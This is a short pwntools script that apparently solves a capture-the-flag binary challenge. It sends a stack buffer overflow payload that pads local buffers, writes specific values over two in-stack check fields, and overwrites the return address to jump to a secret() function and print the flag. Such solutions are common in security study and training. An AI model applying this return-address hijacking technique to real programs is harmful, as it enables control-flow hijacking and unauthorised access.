from pwn import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("./challenge", checksec=False)
# context.log_level = 'debug'
# libc = ELF("./glibc/libc.so.6")

# Run binary 1st time
p = process("./challenge")

payload = b"a"*16                # input
payload += b"a"*16               # mark
payload += b"a"*16               # mark 2
payload += b"a"*16               # password
payload += b"OWEa8iZOfQIFQyl1"   # checker
payload += b"a"*16               # verify
payload += b"CHhMf9iW0F21LC74"   # watchdog
payload += b"a"*8                # rbp
payload += p64(0x40124e)        # secret()

p.sendlineafter(b'input: ', payload)
p.recvuntil(b"flag{")
print(b"flag{"+p.recvall())